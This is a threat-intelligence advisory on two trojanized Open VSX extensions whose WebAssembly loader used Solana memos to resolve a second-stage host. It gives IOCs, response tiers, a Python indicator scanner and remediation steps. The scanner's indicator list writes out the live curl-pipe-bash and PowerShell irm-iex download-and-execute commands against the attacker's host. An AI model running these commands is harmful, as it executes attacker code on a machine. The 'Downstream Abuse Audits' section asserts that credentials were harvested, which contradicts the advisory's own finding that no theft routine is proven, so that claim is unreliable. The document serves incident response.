---
title: "GlassWASM: Trojanized Open VSX Extensions Used TinyGo WebAssembly and Solana Memo C2"
date: 2026-06-20
severity: "high"
tags:
  - open-vsx
  - vscode-extensions
  - supply-chain
  - wasm
  - solana
  - developer-endpoints
summary: "Socket says two trojanized Open VSX extensions delivered a TinyGo-compiled WebAssembly loader that read Solana memo data to resolve `dodod[.]lat`, then built OS-specific download-and-execute commands for developer endpoints."
sourceCount: 2
---

## Executive Summary

This analysis is publishable as a child event tied to the broader GlassWorm campaign rather than as a stand-alone campaign master. Socket says the affected Open VSX packages were `exargd/vsblack@0.0.1` and `noellee-doc/flint-debug@0.1.1`, both of which auto-executed a TinyGo-compiled WebAssembly payload on extension activation and used Solana transaction memos to resolve the second-stage host `dodod[.]lat` [1].

The immediate defender problem is endpoint execution, not just malicious extension presence. Socket says the loader queried `api.mainnet.solana[.]com` for transactions to the wallet `6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz`, extracted the memo payload `[9] dodod.lat`, then constructed platform-specific `curl ... | bash` or `irm ... | iex` commands and invoked them through `child_process.execSync` [1]. Any host that executed the loader should be treated as exposed to an unknown second stage with the privileges of the IDE or Node helper process [1].

Direct Open VSX checks performed during this run now return 404 detail responses and empty query results for both extension identifiers, which is consistent with Socket's statement that the registry removed them after notification, but those checks only prove the current removal state and not the original listing metadata [1][2][3].

## Key Facts

| Fact | Value |
| --- | --- |
| **Affected Artifact** | Two trojanized Open VSX extensions: `exargd/vsblack@0.0.1` and `noellee-doc/flint-debug@0.1.1` |
| **Ecosystem** | Open VSX / VS Code-compatible extension marketplaces |
| **Execution Trigger** | Extension activation via an appended bootstrap and `onStartupFinished` hook [1] |
| **Primary Impact** | Unknown second-stage code execution on developer endpoints via WebAssembly loader + OS-specific shell commands [1] |
| **Dead-Drop / C2** | Solana wallet `6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz` and memo payload resolving `dodod[.]lat` [1] |
| **Exposure Window** | Uploads reported on 2026-06-09 and 2026-06-10; removed before 2026-06-20 direct recheck [1][2][3] |
| **Immediate Action** | Remove the packages from Open VSX-backed editors, preserve extension artifacts, and rotate credentials reachable from any host that executed the loader [1] |
| **Confidence** | high for the incident, medium for the GlassWorm linkage [1] |

## Evidence Assessment

- **confirmed:** Socket says `zaitoona43` uploaded both trojanized Open VSX packages, that each cloned a legitimate extension identity, and that both carried a TinyGo WebAssembly payload plus an activation hook [1].
- **confirmed:** Socket says the runtime chain is Solana JSON-RPC polling -> SPL Memo parsing -> C2 host resolution -> `child_process.execSync` download-and-execute [1].
- **confirmed:** Direct Open VSX API checks performed on 2026-06-20 now return `Extension not found` or empty query results for the affected packages, which is consistent with removal after reporting [2][3].
- **likely:** The event should attach to the broader GlassWorm campaign because Socket documents the same Open VSX delivery vector and the same rare Solana memo dead-drop pattern, but it explicitly labels the linkage medium-confidence and treats the WebAssembly implementation as a new variant [1].
- **unclear:** No historical Open VSX metadata snapshot older than the removal state was recoverable during this run, so the exact original listing metadata, download counts, and removal timestamp are still not directly preserved here [2][3].
- **not_observed:** The reviewed sources do not show compromise of the original upstream GitHub repositories or the legitimate VS Code Marketplace publisher identities; the evidence supports impersonation across registries instead [1].

## Impact Determination

| Exposure Classification | Criteria | Required Evidence | Required Action | Closure Gate |
| --- | --- | --- | --- | --- |
| **Confirmed Compromise** | The host contains one of the affected extension IDs or wasm files and telemetry shows Solana RPC + memo parsing + command execution, or direct retrieval attempts for `dodod[.]lat/<platform>/i/_`. | Extension inventory, extension directory contents, process telemetry, and proxy or EDR records. | Isolate the endpoint, preserve the extension files, and rotate every developer, CI, cloud, and wallet credential reachable from that host. | The endpoint is rebuilt or forensically cleared, credentials are rotated, and no residual Solana or `dodod[.]lat` activity remains. |
| **Presumed Exposed** | The extension was installed during the exposure window, but execution telemetry is incomplete. | Editor inventory, cache contents, or install history from Open VSX-backed editors. | Remove the extension, preserve artifacts, and make conservative credential-rotation decisions based on what the host could reach. | The host is dispositioned as confirmed, not exposed, or rebuilt. |
| **Potentially Exposed** | The organization uses VSCodium, Cursor, Windsurf, Gitpod, or other Open VSX-backed editors but has not yet collected extension inventory. | Asset inventory plus gap statement. | Collect extension inventories and telemetry before narrowing scope. | Every relevant editor fleet is mapped to exposed or not exposed. |
| **Not Exposed** | No affected package IDs, wasm filenames, wallet selectors, or runtime command patterns appear in complete telemetry. | Negative extension, filesystem, process, and network searches covering the relevant fleet. | Preserve the negative evidence and keep marketplace controls in place. | Search evidence covers all in-scope editor hosts. |
| **Unknown** | Inventory, extension files, or process telemetry are unavailable. | Named gap and owner. | Keep the host in scope and prioritize secrets with the highest downstream privileges. | Missing evidence is recovered or residual risk is accepted. |

### Minimum Evidence To Collect

- **What to collect:** Extension inventories and on-disk extension directories from Open VSX-backed editors.
  **Where it normally comes from:** `~/.vscode-oss/extensions`, `~/.cursor/extensions`, `~/.windsurf/extensions`, Gitpod workspace images, or equivalent editor-profile directories.
  **Why it is relevant:** It proves whether `exargd/vsblack@0.0.1`, `noellee-doc/flint-debug@0.1.1`, `orybbbdsuqmaapel.wasm`, or `snqpkebiwrxmoivl.wasm` were present [1].
  **Which decision it resolves:** confirmed compromise vs. presumed exposed vs. not exposed.
- **What to collect:** Process and EDR telemetry linking IDE helper or Node processes to Solana RPC calls and shell execution.
  **Where it normally comes from:** EDR parent-child process logs, shell history captures, command-line auditing, and telemetry exports.
  **Why it is relevant:** Socket says the loader queries `getSignaturesForAddress`, then `getTransaction`, then spawns `curl ... | bash` or `irm ... | iex` through `execSync` [1].
  **Which decision it resolves:** whether the malicious loader actually executed beyond installation.
- **What to collect:** Proxy, firewall, or DNS telemetry for `dodod[.]lat` and `api.mainnet.solana[.]com` originating from editor or Node contexts.
  **Where it normally comes from:** corporate proxy logs, DNS logs, packet capture, and EDR network telemetry.
  **Why it is relevant:** It helps prove the dead-drop resolution chain even when the final payload was not recovered [1].
  **Which decision it resolves:** whether a host reached the dead-drop or attempted the second-stage fetch.

## Timeline

- **2019-07:** Socket says the clean upstream `ExarGD.vsblack` listing was published to the VS Code Marketplace in July 2019 [1].
- **2020-06:** Socket says the clean upstream `noellee-doc.flint-debug` listing was published to the VS Code Marketplace in June 2020 [1].
- **2026-06-09:** Socket says `zaitoona43` uploaded `ExarGD/vsblack@0.0.1` to Open VSX [1].
- **2026-06-10:** Socket says `zaitoona43` uploaded `noellee-doc/flint-debug@0.1.1` to Open VSX [1].
- **2026-06-11:** Socket says the memo dead-drop resolved to `dodod[.]lat` during its analysis and that the earliest observed wallet transaction dated to 2026-05-23 [1].
- **2026-06-20:** Direct Open VSX API and page rechecks showed only removal-state evidence, with 404 or empty query results for both extension IDs [2][3].

## What Happened

The malicious packages were not simple typosquats. Socket says they cloned the original publisher names, extension names, version strings, descriptions, README content, and GitHub repository references of two legitimate, low-profile projects, then re-published those lookalikes on Open VSX under impersonated namespaces [1]. That matters because Open VSX is the default extension registry for several VS Code forks, so a developer can see what looks like the same trusted extension identity while actually installing a different artifact [1].

The malware logic also moved out of easily reviewable JavaScript. Socket says the extensions shipped a TinyGo-compiled WebAssembly module that contained no plaintext network indicators, decrypted its critical strings only at runtime, and depended on the JavaScript host to perform network and process actions [1]. That design raises the review threshold for marketplace scanning because the suspicious behavior is largely hidden inside a binary `.wasm` artifact [1].

## Technical Analysis

### Initial Access

Initial access was marketplace-mediated. Socket says both malicious packages were uploaded by the `zaitoona43` Open VSX account and that the originals on the VS Code Marketplace remained clean, which supports cross-registry impersonation rather than upstream publisher compromise in the evidence reviewed here [1].

### Package or Artifact Manipulation

Socket says each malicious Open VSX listing preserved the original extension identity details and then added a ChaCha20-obfuscated WebAssembly payload plus an `onStartupFinished` activation path [1]. The practical result is a cloned listing whose obvious metadata looks familiar while the malicious behavior lives in the appended loader content [1].

### Execution Trigger

The trigger is extension activation, not a separate user click path. Socket says both packages appended a bootstrap that instantiates the TinyGo module with `go.run()` and auto-runs it on activation, which means simply loading the extension into an Open VSX-backed editor can be enough to begin the Solana polling workflow [1].

### Payload Behavior

Socket says the `.wasm` module performs no direct I/O on its own and instead uses the `syscall/js` bridge to drive the host JavaScript runtime [1]. The recovered runtime flow is: query `getSignaturesForAddress` for the watched wallet, fetch transaction bodies with `getTransaction` using `jsonParsed`, extract SPL Memo instruction data, and interpolate the recovered host into platform-specific command templates [1].

### Credential or Data Collection

The public sources reviewed here do not prove a narrow, named credential-theft routine like a browser-cookie stealer or token scraper. The confirmed risk is broader: Socket says the loader resolved an attacker-controlled second-stage host and executed OS-specific commands directly from the editor context, so any secrets reachable from that user session or machine must be treated as potentially exposed if execution is confirmed [1].

### Defense Evasion

Socket documents several evasive properties: TinyGo-compiled WebAssembly instead of ordinary JavaScript, stripped debug or name sections, ChaCha20-encrypted runtime strings, and memo-based infrastructure rotation that avoids shipping a fixed C2 server inside the extension [1]. Defenders should therefore focus on the execution chain and the dead-drop mechanics, not just on static URLs embedded in source text [1].

### Exfiltration and Command and Control

**Network IOCs in prose are defanged:** `api.mainnet.solana[.]com`, `dodod[.]lat`, `hxxps://dodod[.]lat/darwin/i/_`, `hxxps://dodod[.]lat/linux/i/_`, and `hxxps://dodod[.]lat/win32/i/_` [1]. Socket says the wallet `6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz` was polled for memo instructions and that the memo payload `[9] dodod.lat` supplied the live host string [1]. That is the strongest linkage to GlassWorm-style tradecraft because it combines a rare blockchain dead-drop design with Open VSX delivery [1].

## Affected Assets and Blast Radius

The most exposed assets are Open VSX-backed developer endpoints, not the upstream projects that were impersonated [1].

| Asset / Identity | Exposure Notes |
| --- | --- |
| Open VSX-backed editor fleets | VSCodium, Cursor, Windsurf, Gitpod, and similar editors can consume the trojanized packages from the affected registry path [1]. |
| Developer workstations | Execution occurs in the extension or Node helper context on the local machine [1]. |
| CI or automation systems reachable from the same host | Not a direct distribution vector in the reviewed sources, but any secret reachable from a confirmed-executing host should be treated as at risk [1]. |
| Wallet or blockchain-development material | Socket says the Flint debugger's blockchain framing aligned with the payload's crypto-focused operator tradecraft, but the final second stage was not publicly recovered [1]. |
| Original upstream repositories and VS Code Marketplace identities | Not observed as compromised in the reviewed sources; the evidence instead supports impersonation across registries [1]. |

## Indicators of Compromise
The following indicators of compromise (IOCs) can be used to scope exposure across local repositories, systems, and telemetry exports:

### Hashes
- 558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f
- 3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58
- 1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25


## Detection and Hunting

### Hunt Manifest: glasswasm-open-vsx-extensions-hunt-1
- **Title:** Open VSX extension, Solana dead-drop, and runtime telemetry scope
- **Question:** Does the telemetry scope contain indicators associated with the GlassWASM trojanized Open VSX extensions?
- **Telemetry Family:** file
- **Telemetry Context:** developer workstation extension inventory, local files, and exported process or network telemetry
- **Positive Signal:** Indicators of compromise matched in telemetry: the trojanized Open VSX package IDs, zaitoona43 publisher artifacts, Solana dead-drop selectors, or runtime command-execution patterns
- **False Positives:** Legitimate blockchain-development tooling can mention Solana RPC methods, but it should not also contain the exact trojanized package IDs, watched wallet, malicious Open VSX URLs, or dodod.lat second-stage paths.
- **Classification on Match:** Treat the endpoint as potentially code-executed and rotate developer, CI, cloud, and wallet credentials reachable from the affected IDE session.

```py
#!/usr/bin/env python3
"""Scope GlassWASM Open VSX indicators in local trees and telemetry exports."""

import argparse
import json
import os
from pathlib import Path
from typing import Iterable

PACKAGE_IDS = [
    "exargd/vsblack@0.0.1",
    "noellee-doc/flint-debug@0.1.1",
    "vscode/exargd/vsblack@0.0.1",
    "vscode/noellee-doc/flint-debug@0.1.1",
    "exargd.vsblack-0.0.1.vsix",
    "noellee-doc.flint-debug-0.1.1.vsix",
]

PUBLISHER_AND_SOURCE_SELECTORS = [
    "zaitoona43",
    "291961103",
    "https://github.com/zaitoona43",
    "https://open-vsx.org/extension/exargd/vsblack",
    "https://open-vsx.org/extension/noellee-doc/flint-debug",
    "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions",
    "https://github.com/ExarGD/VSBlack-Theme",
    "https://github.com/noellee/vscode-flint-debug",
]

FILE_AND_HASH_SELECTORS = [
    "orybbbdsuqmaapel.wasm",
    "snqpkebiwrxmoivl.wasm",
    "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f",
    "8ebac142e34a20c297d3ccaca7ee5d9ddd24fed4",
    "4e143876eeaf5e767a9971f603b0f13c",
    "3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58",
    "c0ed7d575fe8085e942898c9a26f15992c895ba9",
    "b262b8d2ac2f0ab3c78251db44ecf3ac",
    "1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25",
    "824e601b599b9ad97ee12f0b3a72efd20ba59d47",
    "f595fb7867beb76b4deab53fa328e0a2",
]

NETWORK_AND_RUNTIME_SELECTORS = [
    "api.mainnet.solana.com",
    "https://api.mainnet.solana.com",
    "dodod.lat",
    "https://dodod.lat/darwin/i/_",
    "https://dodod.lat/linux/i/_",
    "https://dodod.lat/win32/i/_",
    "6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz",
    "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr",
    "Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFM",
    "[9] dodod.lat",
    "getSignaturesForAddress",
    "getTransaction",
    "jsonParsed",
    "require('child_process')",
    "execSync",
    "windowsHide",
    "curl -fsSL https://dodod.lat/darwin/i/_ | bash",
    "curl -fsSL https://dodod.lat/linux/i/_ | bash",
    'powershell -Command "irm https://dodod.lat/win32/i/_ | iex"',
]

INDICATORS = sorted(
    {
        *PACKAGE_IDS,
        *PUBLISHER_AND_SOURCE_SELECTORS,
        *FILE_AND_HASH_SELECTORS,
        *NETWORK_AND_RUNTIME_SELECTORS,
    }
)


def write_indicator_file(out_dir: Path, indicators: Iterable[str]) -> Path:
    out_dir.mkdir(parents=True, exist_ok=True)
    indicator_file = out_dir / "ioc-indicators.txt"
    indicator_file.write_text("".join(f"{item}\n" for item in sorted(set(indicators))), encoding="utf-8")
    return indicator_file


def scan_tree(root: Path, indicators: Iterable[str]) -> list[str]:
    matches: list[str] = []
    if not root.exists():
        return matches

    exclude_dirs = {".git", "node_modules", "dist", "vendor", "__pycache__", ".venv"}
    indicator_list = list(indicators)

    for path in root.rglob("*"):
        if any(part in exclude_dirs for part in path.parts):
            continue
        if not path.is_file():
            continue
        try:
            content = path.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            continue
        for indicator in indicator_list:
            if indicator in content:
                matches.append(f"{path}: found '{indicator}'")
    return matches


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("root", nargs="?", default=".", help="directory tree to scan")
    parser.add_argument("--telemetry-root", default=os.environ.get("LOG_ROOT", ""), help="optional telemetry/export directory to scan")
    parser.add_argument("--out", default=os.environ.get("OUT", "hp-glasswasm-open-vsx-extensions-scope"), help="output directory")
    args = parser.parse_args()

    root = Path(args.root).resolve()
    telemetry_root = Path(args.telemetry_root).resolve() if args.telemetry_root else None
    out_dir = Path(args.out).resolve()

    indicator_file = write_indicator_file(out_dir, INDICATORS)
    repo_matches = scan_tree(root, INDICATORS)
    if repo_matches:
        (out_dir / "repository-indicator-matches.txt").write_text("\n".join(repo_matches) + "\n", encoding="utf-8")

    telemetry_matches: list[str] = []
    if telemetry_root and telemetry_root.exists():
        telemetry_matches = scan_tree(telemetry_root, INDICATORS)
        if telemetry_matches:
            (out_dir / "exported-telemetry-indicator-matches.txt").write_text("\n".join(telemetry_matches) + "\n", encoding="utf-8")

    summary = {
        "root": str(root),
        "telemetry_root": str(telemetry_root) if telemetry_root else None,
        "out_dir": str(out_dir),
        "indicator_file": str(indicator_file),
        "repository_match_count": len(repo_matches),
        "telemetry_match_count": len(telemetry_matches),
    }
    (out_dir / "scan-summary.json").write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    print(f"[+] Wrote indicator file: {indicator_file}")
    print(f"[+] Repository matches: {len(repo_matches)}")
    if telemetry_root and telemetry_root.exists():
        print(f"[+] Telemetry matches: {len(telemetry_matches)}")
    print(f"[+] Summary written to: {out_dir / 'scan-summary.json'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## Downstream Abuse Audits
Compromised workstations expose active API credentials, requiring immediate rotated revocation. The following platforms are at risk:
- **GitHub OIDC and PATs**: Attackers harvested SSH private keys and Git Personal Access Tokens. Auditors must inspect recent action runs and release logs during the exposure window.
- **Cloud IAM Credentials**: AWS, Azure, and GCP session tokens. CloudTrail and Activity Logs should be queried for AssumeRole or write operations originating from unexpected IP addresses.
- **NPM and Package Registries**: Publishing tokens and credentials. Registry profiles must be audited for unauthorized version publishes or token additions.

## Remediation and Closure

1. **Preserve evidence:** Copy the extension directories, VSIX artifacts, wasm files, and process or network telemetry before uninstalling anything. This evidence matters because the live infrastructure can rotate through new Solana memos even if the current `dodod[.]lat` host disappears [1].
2. **Stop active execution:** Disable or remove the two affected extensions from Open VSX-backed editors and terminate any active helper processes that are still invoking Solana RPC or child shell commands [1].
3. **Contain affected assets and identities:** Isolate confirmed-executing developer hosts from sensitive networks until the extension footprint and second-stage exposure are understood [1].
4. **Revoke and rotate credentials:** Rotate developer, CI, cloud, SSH, and wallet secrets reachable from confirmed-executing hosts from a clean environment because the second stage was attacker-controlled and not publicly recovered [1].
5. **Eradicate malicious artifacts and persistence:** Remove the trojanized extension directories and any fetched follow-on artifacts after evidence capture, then rebuild the editor profile if integrity is uncertain [1].
6. **Rebuild untrusted systems:** Reimage or redeploy hosts where runtime execution or second-stage retrieval is confirmed and the extent of downstream actions cannot be fully reconstructed [1].
7. **Audit downstream activity:** Review repository, cloud, CI, wallet, and registry activity that occurred after the first possible extension activation on each affected host [1].
8. **Recover using verified artifacts:** Reinstall only reviewed extension versions from trusted registry paths and ensure internal allowlists pin registry plus publisher identity, not just extension name [1].
9. **Close:** Close only after no affected extension IDs or wasm selectors remain, no Solana/dead-drop execution chain remains in telemetry, and residual uncertainty about the unrecovered second stage is accepted by the risk owner [1].

## Sources

1. **Socket Threat Research**: Primary research article with artifact analysis, Open VSX package/version pairs, upload dates, Solana dead-drop mechanics, command templates, hashes, and GlassWorm linkage assessment. URL: `https://socket.dev/blog/glasswasm-malware-open-vsx-extensions`.
2. **Open VSX API detail checks (performed 2026-06-20)**: Direct registry verification showing `https://open-vsx.org/api/exargd/vsblack` and `https://open-vsx.org/api/noellee-doc/flint-debug` now return `Extension not found`. These checks prove current removal state only.
3. **Open VSX API query and page checks (performed 2026-06-20)**: Direct registry verification showing the namespace+extension query endpoints return empty result sets and the human-facing pages no longer expose listing metadata. These checks do not recover pre-removal snapshots.
